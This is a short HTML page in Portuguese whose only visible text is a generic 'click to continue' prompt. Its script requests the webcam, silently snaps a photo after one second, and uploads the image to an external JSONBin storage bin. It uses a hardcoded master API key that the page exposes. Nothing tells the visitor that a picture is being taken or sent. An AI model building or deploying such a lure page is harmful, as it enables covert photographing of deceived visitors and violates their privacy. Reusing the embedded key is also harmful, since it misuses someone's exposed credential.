<!DOCTYPE html>
<html>
<body style="background:#111; color:white; text-align:center; font-family:sans-serif;">
<h2>Clique no botão para continuar</h2>
<button id="startBtn">Clique aqui para continuar</button>
<video id="video" width="320" height="240" autoplay style="display:none;"></video>
<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
<p id="status"></p>

<script>
const startBtn = document.getElementById('startBtn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const status = document.getElementById('status');
const JSONBIN_KEY = "$2a$10$TGWviiTU6WDwbnoyxXdO1OB.zfLXw2aPhoG4SChWWQYA757BpZBqO";
const BIN_ID = "69d30c2aaaba882197ca5757";

startBtn.onclick = async () => {
    startBtn.style.display = "none";
    video.style.display = "block";

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        setTimeout(async () => {
            canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
            const foto = canvas.toDataURL('image/png');
            status.innerText = "Enviando...";
            
            const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
                headers: { "X-Master-Key": JSONBIN_KEY }
            });
            const json = await res.json();
            
            let lista = [];
            if (json.record && Array.isArray(json.record.record)) {
                lista = json.record.record;
            }
            lista.push(foto);

            await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
                method: "PUT",
                headers: {
                    "Content-Type": "application/json",
                    "X-Master-Key": JSONBIN_KEY
                },
                body: JSON.stringify({ record: lista })
            });

            status.innerText = "Foto enviada!";
            video.style.display = "none";
        }, 1000);

    } catch (err) {
        status.innerText = "Erro!";
        console.error(err);
    }
};
</script>
</body>
</html>
